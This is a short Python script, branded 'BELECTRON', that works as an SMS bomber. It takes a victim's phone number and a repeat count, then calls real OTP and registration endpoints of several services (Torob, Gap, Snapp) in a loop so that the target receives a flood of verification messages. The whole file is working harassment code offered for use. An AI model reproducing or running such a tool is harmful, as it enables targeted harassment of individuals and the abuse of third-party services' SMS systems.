from pyfiglet import Figlet
import requests
import time
address="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
Sa=Figlet(font="slant")
print(Sa.renderText("BELECTRON"))
number=input("Enter Phone Number ---> ")
count=input("Enter Count Of Sms Sent ---> ")
data ={"cellphone": number}
count=int(count)
print("1.One Server")
print("2.Dubble Server")
print("3.Tripple Server")
sht=input("Choose Operation ---> ")
if sht=="1":
    for bomb in range(0, count):
        m=requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + number)
        time.sleep(3)
        print("Sended! (SV1)")
        print("------------------------------")
elif sht=="2":
    for bomb in range(0, count):
        m=requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + number)
        n=requests.get("https://core.gap.im/v1/user/add.json?mobile=" + number)
        time.sleep(3)
        print("Sended! (SV1)")
        print("Sended! (SV2)")
        print("------------------------------")
elif sht=="3":
    for bomb in range(0, count):
        m=requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + number)
        time.sleep(3)
        n=requests.get("https://core.gap.im/v1/user/add.json?mobile=" + number)
        f=requests.post(address, data)
        print("Pin Code Sent! (SV1)")
        print("Pin Code Sent! (SV2)")
        print("Pin Code Sent! (SV3)")
        print("------------------------------")
else:
    print("Somethings Wrong!")
